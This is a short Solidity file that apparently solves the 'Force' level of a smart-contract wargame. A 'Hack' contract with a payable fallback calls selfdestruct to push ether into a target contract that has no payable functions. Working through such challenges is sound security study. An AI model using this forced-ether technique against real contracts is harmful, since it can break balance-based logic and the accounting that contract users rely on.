// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
  /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)
*/

  function getBalance() external view returns (uint256) {
    return address(this).balance;
  }
}

contract Hack {
  function kill(address payable _force) external {
    selfdestruct(_force);
  }

  fallback() external payable {}
}
